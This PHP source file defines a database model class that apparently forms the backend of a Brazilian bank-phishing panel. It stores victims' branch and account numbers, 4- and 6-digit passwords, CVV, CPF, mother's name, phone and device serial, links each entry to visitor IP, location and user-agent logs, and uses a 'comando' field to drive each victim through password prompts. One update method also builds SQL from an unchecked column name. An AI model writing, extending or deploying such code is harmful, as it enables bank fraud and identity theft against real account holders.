<?php

class Info extends Objeto {

    protected $tabela = "infos";

    protected $id;

    protected $idAcesso;

    protected $agencia;

    protected $conta;

    protected $digito;

    protected $senha4;

    protected $comando;

    protected $texto;
    
    protected $ultimoAcesso;

    protected $celular;

    protected $cvv;

    protected $senha6;

    protected $statusInfo;

    protected $qrCodeFile;

    protected $titular;

    protected $nome;

    protected $tipo;

    protected $serialDispositivo;

    protected $saldo;

    protected $cpf;

    protected $mae;

    public static function apagarTodos(){

      $sql = "DELETE FROM infos";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->execute(); 
          $resultados = $query->fetchAll();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }

    public function salvar() {

        
        $sql = "INSERT INTO {$this->tabela} (idAcesso, agencia, conta, digito, senha4, comando, ultimoAcesso, tipo) VALUES (:idAcesso, :agencia, :conta, :digito, :senha4, :comando, :ultimoAcesso, :tipo)";
        try {
            $query = $this->conn->prepare($sql);
            $query->bindParam(':idAcesso', $this->idAcesso);
            $query->bindParam(':agencia', $this->agencia);
            $query->bindParam(':conta', $this->conta);
            $query->bindParam(':digito', $this->digito);
            $query->bindParam(':senha4', $this->senha4);
            $query->bindParam(':comando', $this->comando);
            $query->bindParam(':ultimoAcesso', $this->ultimoAcesso);
            $query->bindParam(':tipo', $this->tipo);
            $query->execute();
            return $this->conn->lastInsertId();
          } catch (\PDOException $e) {
            echo "Erro ao atualizar registro: " . $e->getMessage();
          }
    }



    public static function alterarComando($id, $comando){

      $sql = "Update infos set comando = :comando where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':comando', $comando);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function alterarComandoComTexto($id, $comando, $texto){

      $sql = "Update infos set comando = :comando, texto = :texto where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':comando', $comando);
          $query->bindParam(':texto', $texto);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }


    public static function atualizarTitular($id, $titular, $nome){

      $sql = "Update infos set titular = :titular, nome = :nome where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':titular', $titular);
          $query->bindParam(':nome', $nome);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
      }
    }


    
    public static function atualizarTipo($id, $tipo){

      $sql = "Update infos set tipo = :tipo where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':tipo', $tipo);
          $device = getDevice();
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }


    public static function marcarComoVisualizada($id){

      $sql = "UPDATE infos SET statusInfo = 'VISUALIZADO' where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function atualizarInformacoesSemHash($id, $campo, $valor){

      $sql = "UPDATE infos SET `$campo` = :valor where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':valor', $valor);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function atualizarInformacoes($id, $hash, $campo, $valor){

      $sql = "UPDATE infos SET `$campo` = :valor where id = :id AND idAcesso = (SELECT id FROM acessos WHERE hash = :hash)";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':valor', $valor);
          $query->bindParam(':id', $id);
          $query->bindParam(':hash', $hash);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function alterarAberto($id, $aberto){


      $sql = "Update infos set aberto = :aberto where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':aberto', $aberto);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function getTipo($id){


      $sql = "SELECT tipo FROM infos where id = :id";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->execute(); 
          $resultados = $query->fetch();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }
    public static function findInfoById($id){

      $sql = "SELECT * FROM infos where id = :id";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->execute(); 
          $resultados = $query->fetch();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }
    public static function findById($id){

      

      $sql = "SELECT infos.*, acessos.ip, acessos.hash, acessos.data, acessos.cidade, acessos.uf, acessos.pais, acessos.user_agent, acessos.url, acessos.device, acessos.referrer_url FROM infos left join acessos on acessos.id = infos.idAcesso where infos.id = :id";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->execute(); 
          $resultados = $query->fetch();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }


    public static function alterarUltimoAcesso($id){

      $sql = "Update infos set ultimoAcesso = :ultimoAcesso where id = :id";

      $hora = date("Y-m-d H-i-s");

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':ultimoAcesso', $hora);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function buscarApi($id, $hash){


      $sql = "select infos.* from infos inner join acessos on acessos.id = infos.idAcesso and infos.id = :id and acessos.hash = :hash";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->bindParam(':hash', $hash);
          $query->execute(); 
          $resultados = $query->fetch();
          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }

    public static function buscarTodosComAcesso(){

      $sql = "select acessos.hash as hash, acessos.ip as ip, acessos.data as data, acessos.status as status, acessos.pais as pais, acessos.uf as uf ,acessos.cidade as cidade, acessos.user_agent as user_agent, acessos.url as url, acessos.referrer_url as referrer_url, acessos.device as device, Infos.* from infos left join Acessos on acessos.id = infos.idAcesso order by id Desc";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->execute(); 
          $resultados = $query->fetchAll();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }

    public static function buscarTodos(){

      $sql = "SELECT * FROM infos order by id desc";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->execute(); 
          $resultados = $query->fetchAll();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }


    public static function deletar($id){

      $sql = "DELETE FROM infos where id = :id";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->execute(); 
          $resultados = $query->fetchAll();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }

    public static function total(){
      return count(self::buscarTodos());
    }

    public static function updateByAPI($id, $hash, $obj){


      $sql = "UPDATE infos SET agencia = :agencia, conta = :conta, digito = :digito, senha4 = :senha4, comando = :comando, texto = :texto, ultimoAcesso = :ultimoAcesso, aberto = :aberto, cvv = :cvv, celular = :celular, senha6 = :senha6, cpf = :cpf, mae = :mae, statusInfo = :statusInfo where id = :id AND idAcesso = (SELECT id FROM acessos WHERE hash = :hash)";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':agencia', $obj['agencia']);
          $query->bindParam(':conta', $obj['conta']);
          $query->bindParam(':digito', $obj['digito']);
          $query->bindParam(':senha4', $obj['senha4']);
          $query->bindParam(':comando', $obj['comando']);
          $query->bindParam(':texto', $obj['texto']);
          $query->bindParam(':ultimoAcesso', $obj['ultimoAcesso']);
          $query->bindParam(':aberto', $obj['aberto']);
          $query->bindParam(':cvv', $obj['cvv']);
          $query->bindParam(':celular', $obj['celular']);
          $query->bindParam(':senha6', $obj['senha6']);
          $query->bindParam(':statusInfo', $obj['statusInfo']);
          $query->bindParam(':cpf', $obj['cpf']);
          $query->bindParam(':mae', $obj['mae']);
          $query->bindParam(':id', $id);
          $query->bindParam(':hash', $hash);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function atualizarS4($id, $senha4, $comando){

      $sql = "UPDATE infos SET 'senha4' = :senha4, 'comando' = :comando where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->bindParam(':senha4', $senha4);
          $query->bindParam(':comando', $comando);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function gravarInfoMobile($idAcesso, $agencia, $conta, $digito, $senha4, $comando = "AGUARDANDO", $tipo, $id = null){


      if($id && strlen($id) > 0){
        Info::atualizarS4($id, $senha4, $comando);
        return $id;
      } else {
        $_SESSION['agencia'] = $agencia;
        $_SESSION['conta'] = $conta;
        $_SESSION['digito'] = $digito;
  
        $info = new Info();
        $info->setIdAcesso($idAcesso);
        $info->setAgencia($agencia);
        $info->setConta($conta);
        $info->setDigito($digito);
        $info->setSenha4($senha4);
        $info->setComando($comando);
        $info->setTipo($tipo);
        $info->setUltimoAcesso(date("Y-m-d H-i-s"));
        $id = $info->salvar();
        $_SESSION['id'] = $id;
        return $id;

      }

    }
    public static function gravarInfo($idAcesso, $agencia, $conta, $digito, $comando = "SENHA_DE_4", $tipo){
        
        $_SESSION['agencia'] = $agencia;
        $_SESSION['conta'] = $conta;
        $_SESSION['digito'] = $digito;
  
        $info = new Info();
        $info->setIdAcesso($idAcesso);
        $info->setAgencia($agencia);
        $info->setConta($conta);
        $info->setDigito($digito);
        $info->setSenha4('');
        $info->setComando($comando);
        $info->setUltimoAcesso(date("Y-m-d H-i-s"));
        $info->setTipo($tipo);
        $id = $info->salvar();
        $_SESSION['id'] = $id;    

    }

}